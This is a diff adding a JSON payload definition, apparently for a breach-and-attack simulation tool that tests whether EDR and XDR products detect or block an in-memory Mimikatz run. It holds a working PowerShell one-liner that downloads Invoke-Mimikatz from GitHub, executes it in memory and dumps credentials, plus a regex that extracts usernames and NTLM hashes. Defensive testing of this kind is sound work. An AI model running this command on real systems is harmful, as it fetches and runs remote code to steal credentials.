@@ -1,0 +1,62 @@
+{
+  "command_content": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1003.001"
+  ],
+  "payload_description": "In-Memory Mimikatz",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "56a1b6bb-f403-41be-993c-bdda2467978b",
+  "payload_name": "In-Memory Mimikatz- DumpCreds",
+  "payload_output_parsers": [
+    {
+      "output_parser_contract_output_elements": [
+        {
+          "contract_output_element_is_finding": true,
+          "contract_output_element_key": "Mimikatz_Memory_NTLM",
+          "contract_output_element_name": "Mimikatz_Memory_NTLM",
+          "contract_output_element_regex_groups": [
+            {
+              "regex_group_field": "username",
+              "regex_group_index_values": "$1"
+            },
+            {
+              "regex_group_field": "password",
+              "regex_group_index_values": "$2"
+            }
+          ],
+          "contract_output_element_rule": "(?:\\\\t|\\s)*\\*?\\s*Username\\s*:\\s*([^\\s\\\\r\\\\n]+)[\\s\\S]*?NTLM\\s*:\\s*([A-Fa-f0-9]{32})",
+          "contract_output_element_type": "credentials"
+        }
+      ],
+      "output_parser_mode": "STDOUT",
+      "output_parser_type": "REGEX"
+    }
+  ],
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
